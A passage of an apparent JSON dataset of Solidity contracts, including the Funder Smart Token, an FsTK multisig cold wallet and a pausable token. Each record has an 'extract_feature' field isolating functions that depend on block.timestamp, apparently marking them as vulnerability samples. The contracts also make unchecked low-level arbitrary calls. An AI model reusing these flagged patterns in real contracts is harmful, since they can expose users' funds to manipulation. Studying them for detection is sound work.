address(0), value);\n }\n function setMetadata(string infoUrl) public onlyFsTKAuthorized {\n setMetadata0(infoUrl);\n }\n function setLiquid(bool liquidity) public onlyFsTKAuthorized {\n setLiquid0(liquidity);\n }\n function setERC20ApproveChecking(bool approveChecking) public onlyFsTKAuthorized {\n super.setERC20ApproveChecking(approveChecking);\n }\n function setDelegate(bool delegate) public onlyFsTKAuthorized {\n super.setDelegate(delegate);\n }\n function setDirectDebit(bool directDebit) public onlyFsTKAuthorized {\n super.setDirectDebit(directDebit);\n }\n function transferToken(ERC20 erc20, address to, uint256 value) public onlyFsTKAuthorized {\n erc20.transfer(to, value);\n }\n}",
  "extract_feature": [
    "function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) {\nAccount storage debtorAccount = accounts[debtor];\nDirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\nuint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\nuint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\nrequire(amount > 0);\ndebtorAccount.balance = debtorAccount.balance.sub(amount);\naccounts[msg.sender].balance += amount;\ndebit.epoch = epoch;\nemit Transfer(debtor, msg.sender, amount);\nreturn true;\n}",
    "function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) {\nAccount storage receiverAccount = accounts[msg.sender];\nresult = true;\nuint256 total;\nfor (uint256 i = 0; i < debtors.length; i++) {\naddress debtor = debtors[i];\nAccount storage debtorAccount = accounts[debtor];\nDirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\nuint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\nuint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\nrequire(amount > 0);\nuint256 debtorBalance = debtorAccount.balance;\nif (amount > debtorBalance) {\nif (strict) {\nrevert();\n}\nresult = false;\nemit WithdrawDirectDebitFailure(debtor, msg.sender);\n} else {\ndebtorAccount.balance = debtorBalance - amount;\ntotal += amount;\ndebit.epoch = epoch;\nemit Transfer(debtor, msg.sender, amount);\n}\n}\nreceiverAccount.balance += total;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ebe"
  },
  "filename": "10296.sol",
  "content": "pragma solidity ^0.4.24;\npragma experimental \"v0.5.0\";\npragma experimental ABIEncoderV2;\nlibrary AddressExtension {\n function isValid(address _address) internal pure returns (bool) {\n return 0 != _address;\n }\n function isAccount(address _address) internal view returns (bool result) {\n assembly {\n result := iszero(extcodesize(_address))\n }\n }\n function toBytes(address _address) internal pure returns (bytes b) {\n assembly {\n let m := mload(0x40)\n mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, _address))\n mstore(0x40, add(m, 52))\n b := m\n }\n }\n}\nlibrary Math {\n struct Fraction {\n uint256 numerator;\n uint256 denominator;\n }\n function isPositive(Fraction memory fraction) internal pure returns (bool) {\n return fraction.numerator > 0 && fraction.denominator > 0;\n }\n function mul(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a * b;\n require((a == 0) || (r / a == b));\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a - b) <= a);\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a + b) >= a);\n }\n function min(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x >= y ? x : y;\n }\n function mulDiv(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n r /= d;\n } else {\n r = mul(value / d, m);\n }\n }\n function mulDivCeil(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n if (r % d == 0) {\n r /= d;\n } else {\n r = (r / d) + 1;\n }\n } else {\n r = mul(value / d, m);\n if (value % d != 0) {\n r += 1;\n }\n }\n }\n function mul(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.numerator, f.denominator);\n }\n function mulCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.numerator, f.denominator);\n }\n function div(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.denominator, f.numerator);\n }\n function divCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.denominator, f.numerator);\n }\n function mul(Fraction memory x, Fraction memory y) internal pure returns (Math.Fraction) {\n return Math.Fraction({\n numerator: mul(x.numerator, y.numerator),\n denominator: mul(x.denominator, y.denominator)\n });\n }\n}\ncontract FsTKAuthority {\n function isAuthorized(address sender, address _contract, bytes data) public view returns (bool);\n function isApproved(bytes32 hash, uint256 approveTime, bytes approveToken) public view returns (bool);\n function validate() public pure returns (bytes4);\n}\ncontract Authorizable {\n event SetFsTKAuthority(FsTKAuthority indexed _address);\n modifier onlyFsTKAuthorized {\n require(fstkAuthority.isAuthorized(msg.sender, this, msg.data));\n _;\n }\n modifier onlyFsTKApproved(bytes32 hash, uint256 approveTime, bytes approveToken) {\n require(fstkAuthority.isApproved(hash, approveTime, approveToken));\n _;\n }\n FsTKAuthority internal fstkAuthority;\n constructor(FsTKAuthority _fstkAuthority) internal {\n fstkAuthority = _fstkAuthority;\n }\n function setFsTKAuthority(FsTKAuthority _fstkAuthority) public onlyFsTKAuthorized {\n require(_fstkAuthority.validate() == _fstkAuthority.validate.selector);\n emit SetFsTKAuthority(fstkAuthority = _fstkAuthority);\n }\n}\ncontract ERC20 {\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function balanceOf(address owner) public view returns (uint256);\n function allowance(address owner, address spender) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n}\ncontract SecureERC20 is ERC20 {\n event SetERC20ApproveChecking(bool approveChecking);\n function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool);\n function increaseAllowance(address spender, uint256 value) public returns (bool);\n function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool);\n function setERC20ApproveChecking(bool approveChecking) public;\n}\ncontract FsTKToken {\n event Consume(address indexed from, uint256 value, bytes32 challenge);\n event IncreaseNonce(address indexed from, uint256 nonce);\n event SetupDirectDebit(address indexed debtor, address indexed receiver, DirectDebitInfo info);\n event TerminateDirectDebit(address indexed debtor, address indexed receiver);\n event WithdrawDirectDebitFailure(address indexed debtor, address indexed receiver);\n event SetMetadata(string metadata);\n event SetLiquid(bool liquidity);\n event SetDelegate(bool isDelegateEnable);\n event SetDirectDebit(bool isDirectDebitEnable);\n struct DirectDebitInfo {\n uint256 amount;\n uint256 startTime;\n uint256 interval;\n }\n struct DirectDebit {\n DirectDebitInfo info;\n uint256 epoch;\n }\n struct Instrument {\n uint256 allowance;\n DirectDebit directDebit;\n }\n struct Account {\n uint256 balance;\n uint256 nonce;\n mapping (address => Instrument) instruments;\n }\n function spendableAllowance(address owner, address spender) public view returns (uint256);\n function transfer(uint256[] data) public returns (bool);\n function transferAndCall(address to, uint256 value, bytes data) public payable returns (bool);\n function nonceOf(address owner) public view returns (uint256);\n function increaseNonce() public returns (bool);\n function delegateTransferAndCall(\n uint256 nonce,\n uint256 fee,\n address to,\n uint256 value,\n bytes data,\n address delegator,\n uint8 v,\n bytes32 r,\n bytes32 s\n ) public returns (bool);\n function directDebit(address debtor, address receiver) public view returns (DirectDebit);\n function setupDirectDebit(address receiver, DirectDebitInfo info) public returns (bool);\n function terminateDirectDebit(address receiver) public returns (bool);\n function withdrawDirectDebit(address debtor) public returns (bool);\n function withdrawDirectDebit(address[] debtors, bool strict) public returns (bool);\n}\ncontract ERC20Like is SecureERC20, FsTKToken {\n using AddressExtension for address;\n using Math for uint256;\n modifier liquid {\n require(isLiquid);\n _;\n }\n modifier canUseDirectDebit {\n require(isDirectDebitEnable);\n _;\n }\n modifier canDelegate {\n require(isDelegateEnable);\n _;\n }\n modifier notThis(address _address) {\n require(_address != address(this));\n _;\n }\n bool public erc20ApproveChecking;\n bool public isLiquid = true;\n bool public isDelegateEnable;\n bool public isDirectDebitEnable;\n string public metadata;\n mapping(address => Account) internal accounts;\n constructor(string _metadata) public {\n metadata = _metadata;\n }\n function balanceOf(address owner) public view returns (uint256) {\n return accounts[owner].balance;\n }\n function allowance(address owner, address spender) public view returns (uint256) {\n return accounts[owner].instruments[spender].allowance;\n }\n function transfer(address to, uint256 value) public liquid returns (bool) {\n Account storage senderAccount = accounts[msg.sender];\n senderAccount.balance = senderAccount.balance.sub(value);\n accounts[to].balance += value;\n emit Transfer(msg.sender, to, value);\n return true;\n }\n function transferFrom(address from, address to, uint256 value) public liquid returns (bool) {\n Account storage fromAccount = accounts[from];\n Instrument storage senderInstrument = fromAccount.instruments[msg.sender];\n fromAccount.balance = fromAccount.balance.sub(value);\n senderInstrument.allowance = senderInstrument.allowance.sub(value);\n accounts[to].balance += value;\n emit Transfer(from, to, value);\n return true;\n }\n function approve(address spender, uint256 value) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n if (erc20ApproveChecking) {\n require((value == 0) || (spenderInstrument.allowance == 0));\n }\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = value\n );\n return true;\n }\n function setERC20ApproveChecking(bool approveChecking) public {\n emit SetERC20ApproveChecking(erc20ApproveChecking = approveChecking);\n }\n function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n require(spenderInstrument.allowance == expectedValue);\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = newValue\n );\n return true;\n }\n function increaseAllowance(address spender, uint256 value) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = spenderInstrument.allowance.add(value)\n );\n return true;\n }\n function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n uint256 currentValue = spenderInstrument.allowance;\n uint256 newValue;\n if (strict) {\n newValue = currentValue.sub(value);\n } else if (value < currentValue) {\n newValue = currentValue - value;\n }\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = newValue\n );\n return true;\n }\n function setMetadata0(string _metadata) internal {\n emit SetMetadata(metadata = _metadata);\n }\n function setLiquid0(bool liquidity) internal {\n emit SetLiquid(isLiquid = liquidity);\n }\n function setDelegate(bool delegate) public {\n emit SetDelegate(isDelegateEnable = delegate);\n }\n function setDirectDebit(bool directDebit) public {\n emit SetDirectDebit(isDirectDebitEnable = directDebit);\n }\n function spendableAllowance(address owner, address spender) public view returns (uint256) {\n Account storage ownerAccount = accounts[owner];\n return Math.min(\n ownerAccount.instruments[spender].allowance,\n ownerAccount.balance\n );\n }\n function transfer(uint256[] data) public liquid returns (bool) {\n Account storage senderAccount = accounts[msg.sender];\n uint256 totalValue;\n for (uint256 i = 0; i < data.length; i++) {\n address receiver = address(data[i] >> 96);\n uint256 value = data[i] & 0xffffffffffffffffffffffff;\n totalValue = totalValue.add(value);\n accounts[receiver].balance += value;\n emit Transfer(msg.sender, receiver, value);\n }\n senderAccount.balance = senderAccount.balance.sub(totalValue);\n return true;\n }\n function transferAndCall(\n address to,\n uint256 value,\n bytes data\n )\n public\n payable\n liquid\n notThis(to)\n returns (bool)\n {\n require(\n transfer(to, value) &&\n data.length >= 68\n );\n assembly {\n mstore(add(data, 36), value)\n mstore(add(data, 68), caller)\n }\n require(to.call.value(msg.value)(data));\n return true;\n }\n function nonceOf(address owner) public view returns (uint256) {\n return accounts[owner].nonce;\n }\n function increaseNonce() public returns (bool) {\n emit IncreaseNonce(msg.sender, accounts[msg.sender].nonce += 1);\n }\n function delegateTransferAndCall(\n uint256 nonce,\n uint256 fee,\n address to,\n uint256 value,\n bytes data,\n address delegator,\n uint8 v,\n bytes32 r,\n bytes32 s\n )\n public\n liquid\n canDelegate\n notThis(to)\n returns (bool)\n {\n address signer = ecrecover(\n keccak256(abi.encodePacked(nonce, fee, to, value, data, delegator)),\n v,\n r,\n s\n );\n Account storage signerAccount = accounts[signer];\n require(\n nonce == signerAccount.nonce &&\n (delegator == address(0) || delegator == msg.sender)\n );\n emit IncreaseNonce(signer, signerAccount.nonce += 1);\n signerAccount.balance = signerAccount.balance.sub(value.add(fee));\n accounts[to].balance += value;\n emit Transfer(signer, to, value);\n accounts[msg.sender].balance += fee;\n emit Transfer(signer, msg.sender, fee);\n if (!to.isAccount()) {\n require(data.length >= 68);\n assembly {\n mstore(add(data, 36), value)\n mstore(add(data, 68), signer)\n }\n require(to.call(data));\n }\n return true;\n }\n function directDebit(address debtor, address receiver) public view returns (DirectDebit) {\n return accounts[debtor].instruments[receiver].directDebit;\n }\n function setupDirectDebit(\n address receiver,\n DirectDebitInfo info\n )\n public\n returns (bool)\n {\n accounts[msg.sender].instruments[receiver].directDebit = DirectDebit({\n info: info,\n epoch: 0\n });\n emit SetupDirectDebit(msg.sender, receiver, info);\n return true;\n }\n function terminateDirectDebit(address receiver) public returns (bool) {\n delete accounts[msg.sender].instruments[receiver].directDebit;\n emit TerminateDirectDebit(msg.sender, receiver);\n return true;\n }\n function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) {\n Account storage debtorAccount = accounts[debtor];\n DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\n uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\n uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\n require(amount > 0);\n debtorAccount.balance = debtorAccount.balance.sub(amount);\n accounts[msg.sender].balance += amount;\n debit.epoch = epoch;\n emit Transfer(debtor, msg.sender, amount);\n return true;\n }\n function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) {\n Account storage receiverAccount = accounts[msg.sender];\n result = true;\n uint256 total;\n for (uint256 i = 0; i < debtors.length; i++) {\n address debtor = debtors[i];\n Account storage debtorAccount = accounts[debtor];\n DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\n uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\n uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\n require(amount > 0);\n uint256 debtorBalance = debtorAccount.balance;\n if (amount > debtorBalance) {\n if (strict) {\n revert();\n }\n result = false;\n emit WithdrawDirectDebitFailure(debtor, msg.sender);\n } else {\n debtorAccount.balance = debtorBalance - amount;\n total += amount;\n debit.epoch = epoch;\n emit Transfer(debtor, msg.sender, amount);\n }\n }\n receiverAccount.balance += total;\n }\n}\ncontract FsTKAllocation {\n function initialize(uint256 _vestedAmount) public;\n}\ncontract FunderSmartToken is Authorizable, ERC20Like {\n string public constant name = \"Funder Smart Token\";\n string public constant symbol = \"FST\";\n uint256 public constant totalSupply = 330000000 ether;\n uint8 public constant decimals = 18;\n constructor(\n FsTKAuthority _fstkAuthority,\n string _metadata,\n address coldWallet,\n FsTKAllocation allocation\n )\n Authorizable(_fstkAuthority)\n ERC20Like(_metadata)\n public\n {\n uint256 vestedAmount = totalSupply / 12;\n accounts[allocation].balance = vestedAmount;\n emit Transfer(address(0), allocation, vestedAmount);\n allocation.initialize(vestedAmount);\n uint256 releaseAmount = totalSupply - vestedAmount;\n accounts[coldWallet].balance = releaseAmount;\n emit Transfer(address(0), coldWallet, releaseAmount);\n }\n function setMetadata(string infoUrl) public onlyFsTKAuthorized {\n setMetadata0(infoUrl);\n }\n function setLiquid(bool liquidity) public onlyFsTKAuthorized {\n setLiquid0(liquidity);\n }\n function setERC20ApproveChecking(bool approveChecking) public onlyFsTKAuthorized {\n super.setERC20ApproveChecking(approveChecking);\n }\n function setDelegate(bool delegate) public onlyFsTKAuthorized {\n super.setDelegate(delegate);\n }\n function setDirectDebit(bool directDebit) public onlyFsTKAuthorized {\n super.setDirectDebit(directDebit);\n }\n function transferToken(ERC20 erc20, address to, uint256 value) public onlyFsTKAuthorized {\n erc20.transfer(to, value);\n }\n}",
  "extract_feature": [
    "function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) {\nAccount storage debtorAccount = accounts[debtor];\nDirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\nuint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\nuint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\nrequire(amount > 0);\ndebtorAccount.balance = debtorAccount.balance.sub(amount);\naccounts[msg.sender].balance += amount;\ndebit.epoch = epoch;\nemit Transfer(debtor, msg.sender, amount);\nreturn true;\n}",
    "function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) {\nAccount storage receiverAccount = accounts[msg.sender];\nresult = true;\nuint256 total;\nfor (uint256 i = 0; i < debtors.length; i++) {\naddress debtor = debtors[i];\nAccount storage debtorAccount = accounts[debtor];\nDirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\nuint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\nuint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\nrequire(amount > 0);\nuint256 debtorBalance = debtorAccount.balance;\nif (amount > debtorBalance) {\nif (strict) {\nrevert();\n}\nresult = false;\nemit WithdrawDirectDebitFailure(debtor, msg.sender);\n} else {\ndebtorAccount.balance = debtorBalance - amount;\ntotal += amount;\ndebit.epoch = epoch;\nemit Transfer(debtor, msg.sender, amount);\n}\n}\nreceiverAccount.balance += total;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ebf"
  },
  "filename": "10297.sol",
  "content": "pragma solidity ^0.4.24;\npragma experimental \"v0.5.0\";\npragma experimental ABIEncoderV2;\nlibrary Math {\n struct Fraction {\n uint256 numerator;\n uint256 denominator;\n }\n function isPositive(Fraction memory fraction) internal pure returns (bool) {\n return fraction.numerator > 0 && fraction.denominator > 0;\n }\n function mul(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a * b;\n require((a == 0) || (r / a == b));\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a - b) <= a);\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a + b) >= a);\n }\n function min(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x >= y ? x : y;\n }\n function mulDiv(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n r /= d;\n } else {\n r = mul(value / d, m);\n }\n }\n function mulDivCeil(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n if (r % d == 0) {\n r /= d;\n } else {\n r = (r / d) + 1;\n }\n } else {\n r = mul(value / d, m);\n if (value % d != 0) {\n r += 1;\n }\n }\n }\n function mul(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.numerator, f.denominator);\n }\n function mulCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.numerator, f.denominator);\n }\n function div(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.denominator, f.numerator);\n }\n function divCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.denominator, f.numerator);\n }\n function mul(Fraction memory x, Fraction memory y) internal pure returns (Math.Fraction) {\n return Math.Fraction({\n numerator: mul(x.numerator, y.numerator),\n denominator: mul(x.denominator, y.denominator)\n });\n }\n}\ncontract FsTKColdWallet {\n using Math for uint256;\n event ConfirmationNeeded(address indexed initiator, bytes32 indexed operation, address indexed to, uint256 value, bytes data);\n event Confirmation(address indexed authority, bytes32 indexed operation);\n event Revoke(address indexed authority, bytes32 indexed operation);\n event AuthorityChanged(address indexed oldAuthority, address indexed newAuthority);\n event AuthorityAdded(address authority);\n event AuthorityRemoved(address authority);\n event RequirementChanged(uint256 required);\n event DayLimitChanged(uint256 dayLimit);\n event SpentTodayReset(uint256 spentToday);\n event Deposit(address indexed from, uint256 value);\n event SingleTransaction(address indexed authority, address indexed to, uint256 value, bytes data, address created);\n event MultiTransaction(address indexed authority, bytes32 indexed operation, address indexed to, uint256 value, bytes data, address created);\n struct TransactionInfo {\n address to;\n uint256 value;\n bytes data;\n }\n struct PendingTransactionState {\n TransactionInfo info;\n uint256 confirmNeeded;\n uint256 confirmBitmap;\n uint256 index;\n }\n modifier onlyAuthority {\n require(isAuthority(msg.sender));\n _;\n }\n modifier confirmAndRun(bytes32 operation) {\n if (confirmAndCheck(operation)) {\n _;\n }\n }\n uint256 constant MAX_AUTHORITIES = 250;\n uint256 public requiredAuthorities;\n uint256 public numAuthorities;\n uint256 public dailyLimit;\n uint256 public spentToday;\n uint256 public lastDay;\n address[256] public authorities;\n mapping(address => uint256) public authorityIndex;\n mapping(bytes32 => PendingTransactionState) public pendingTransaction;\n bytes32[] public pendingOperation;\n constructor(address[] _authorities, uint256 required, uint256 _daylimit) public {\n require(\n required > 0 &&\n authorities.length >= required\n );\n numAuthorities = _authorities.length;\n for (uint256 i = 0; i < _authorities.length; i += 1) {\n authorities[1 + i] = _authorities[i];\n authorityIndex[_authorities[i]] = 1 + i;\n }\n requiredAuthorities = required;\n dailyLimit = _daylimit;\n lastDay = today();\n }\n function() external payable {\n if (msg.value > 0) {\n emit Deposit(msg.sender, msg.value);\n }\n }\n function getAuthority(uint256 index) public view returns (address) {\n return authorities[index + 1];\n }\n function getAuthorityIndex(address authority) public view returns (uint256 index) {\n index = authorityIndex[authority];\n require(index > 0);\n }\n function isAuthority(address authority) public view returns (bool) {\n return authorityIndex[authority] > 0;\n }\n function hasConfirmed(bytes32 operation, address _address) public view returns (bool) {\n return (pendingTransaction[operation].confirmBitmap & (1 << getAuthorityIndex(_address))) != 0;\n }\n function changeAuthority(address from, address to) public confirmAndRun(keccak256(msg.data)) {\n require(!isAuthority(to));\n uint256 index = getAuthorityIndex(from);\n authorities[index] = to;\n authorityIndex[to] = index;\n delete authorityIndex[from];\n clearPending();\n emit AuthorityChanged(from, to);\n }\n function addAuthority(address authority) public confirmAndRun(keccak256(msg.data)) {\n require(!isAuthority(authority));\n if (numAuthorities >= MAX_AUTHORITIES) {\n reOrganizeAuthorities();\n }\n require(numAuthorities < MAX_AUTHORITIES);\n numAuthorities += 1;\n authorities[numAuthorities] = authority;\n authorityIndex[authority] = numAuthorities;\n clearPending();\n emit AuthorityAdded(authority);\n }\n function removeAuthority(address authority) public confirmAndRun(keccak256(msg.data)) {\n require(numAuthorities > requiredAuthorities);\n uint256 index = getAuthorityIndex(authority);\n delete authorities[index];\n delete authorityIndex[authority];\n clearPending();\n reOrganizeAuthorities();\n emit AuthorityRemoved(authority);\n }\n function setRequirement(uint256 required) public confirmAndRun(keccak256(msg.data)) {\n require(numAuthorities >= requiredAuthorities);\n clearPending();\n emit RequirementChanged(requiredAuthorities = required);\n }\n function setDailyLimit(uint256 _dailyLimit) public confirmAndRun(keccak256(msg.data)) {\n clearPending();\n emit DayLimitChanged(dailyLimit = _dailyLimit);\n }\n function resetSpentToday() public confirmAndRun(keccak256(msg.data)) {\n clearPending();\n emit SpentTodayReset(spentToday);\n delete spentToday;\n }\n function propose(\n address to,\n uint256 value,\n bytes data\n )\n public\n onlyAuthority\n returns (bytes32 operation)\n {\n if ((data.length == 0 && checkAndUpdateLimit(value)) || requiredAuthorities == 1) {\n emit SingleTransaction(msg.sender, to, value, data, execute0(to, value, data));\n } else {\n operation = keccak256(abi.encodePacked(msg.data, pendingOperation.length));\n PendingTransactionState storage status = pendingTransaction[operation];\n if (status.info.to == 0 && status.info.value == 0 && status.info.data.length == 0) {\n status.info = TransactionInfo({\n to: to,\n value: value,\n data: data\n });\n }\n if (!confirm(operation)) {\n emit ConfirmationNeeded(msg.sender, operation, to, value, data);\n }\n }\n }\n function revoke(bytes32 operation) public {\n uint256 confirmFlag = 1 << getAuthorityIndex(msg.sender);\n PendingTransactionState storage state = pendingTransaction[operation];\n if (state.confirmBitmap & confirmFlag > 0) {\n state.confirmNeeded += 1;\n state.confirmBitmap &= ~confirmFlag;\n emit Revoke(msg.sender, operation);\n }\n }\n function confirm(bytes32 operation) public confirmAndRun(operation) returns (bool) {\n PendingTransactionState storage status = pendingTransaction[operation];\n if (status.info.to != 0 || status.info.value != 0 || status.info.data.length != 0) {\n emit MultiTransaction(\n msg.sender,\n operation,\n status.info.to,\n status.info.value,\n status.info.data,\n execute0(status.info.to, status.info.value, status.info.data)\n );\n delete pendingTransaction[operation].info;\n return true;\n }\n }\n function execute0(\n address to,\n uint256 value,\n bytes data\n )\n private\n returns (address created)\n {\n if (to == 0) {\n created = create0(value, data);\n } else {\n require(to.call.value(value)(data));\n }\n }\n function create0(uint256 value, bytes code) internal returns (address _address) {\n assembly {\n _address := create(value, add(code, 0x20), mload(code))\n if iszero(extcodesize(_address)) {\n revert(0, 0)\n }\n }\n }\n function confirmAndCheck(bytes32 operation) private returns (bool) {\n PendingTransactionState storage pending = pendingTransaction[operation];\n if (pending.confirmNeeded == 0) {\n pending.confirmNeeded = requiredAuthorities;\n delete pending.confirmBitmap;\n pending.index = pendingOperation.length;\n pendingOperation.push(operation);\n }\n uint256 confirmFlag = 1 << getAuthorityIndex(msg.sender);\n if (pending.confirmBitmap & confirmFlag == 0) {\n emit Confirmation(msg.sender, operation);\n if (pending.confirmNeeded <= 1) {\n delete pendingOperation[pending.index];\n delete pending.confirmNeeded;\n delete pending.confirmBitmap;\n delete pending.index;\n return true;\n } else {\n pending.confirmNeeded -= 1;\n pending.confirmBitmap |= confirmFlag;\n }\n }\n }\n function checkAndUpdateLimit(uint256 value) private returns (bool) {\n if (today() > lastDay) {\n spentToday = 0;\n lastDay = today();\n }\n uint256 _spentToday = spentToday.add(value);\n if (_spentToday <= dailyLimit) {\n spentToday = _spentToday;\n return true;\n }\n return false;\n }\n function today() private view returns (uint256) {\n return block.timestamp / 1 days;\n }\n function reOrganizeAuthorities() private {\n uint256 free = 1;\n while (free < numAuthorities) {\n while (free < numAuthorities && authorities[free] != 0) {\n free += 1;\n }\n while (numAuthorities > 1 && authorities[numAuthorities] == 0) {\n numAuthorities -= 1;\n }\n if (free < numAuthorities && authorities[numAuthorities] != 0 && authorities[free] == 0) {\n authorities[free] = authorities[numAuthorities];\n authorityIndex[authorities[free]] = free;\n delete authorities[numAuthorities];\n }\n }\n }\n function clearPending() private {\n for (uint256 i = 0; i < pendingOperation.length; i += 1) {\n delete pendingTransaction[pendingOperation[i]];\n }\n delete pendingOperation;\n }\n}",
  "extract_feature": [
    "function today() private view returns (uint256) {\nreturn block.timestamp / 1 days;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ec0"
  },
  "filename": "10342.sol",
  "content": "pragma solidity ^0.4.23;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = 